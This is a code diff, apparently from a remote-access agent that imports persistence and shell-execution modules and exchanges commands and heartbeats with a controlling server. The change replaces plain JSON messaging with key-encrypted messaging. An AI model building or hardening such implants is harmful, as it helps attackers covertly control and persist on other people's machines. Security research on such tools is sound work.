@@ -6,7 +6,7 @@ from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives import hashes, serialization
 from system_info import get_system_info
 from shell import run_command
-from helper import send_json, receive_json
+from helper import send_secure_json, receive_secure_json
 from persistence import setup_persistence
 
 
@@ -58,10 +58,10 @@ def communicate(s: socket.socket, system_info: dict) -> None:
             agent_hello["agent_id"] = agent_id
 
         # Send agent hello message
-        send_json(s, agent_hello)
+        send_secure_json(s, derived_key, agent_hello)
 
         # Receive server hello message
-        server_hello = receive_json(s)
+        server_hello = receive_secure_json(s, derived_key)
         if server_hello.get("type") != "server-hello":
             continue
 
@@ -71,7 +71,7 @@ def communicate(s: socket.socket, system_info: dict) -> None:
 
         while True:
             try:
-                message = receive_json(s)
+                message = receive_secure_json(s, derived_key)
                 if message is None:
                     print("Server disconnected.")
                     s.close()
@@ -85,13 +85,13 @@ def communicate(s: socket.socket, system_info: dict) -> None:
                         "response": response_tuple[0],
                         "cwd":  response_tuple[1],
                     }
-                    send_json(s, response)
+                    send_secure_json(s, derived_key, response)
 
             except socket.timeout:  # If socket timeout, send heartbeat
                 message = {
                     "type": "heartbeat",
                 }
-                send_json(s, message)
+                send_secure_json(s, derived_key, message)
                 print("Heartbeat sent.")
 
             except Exception as e:
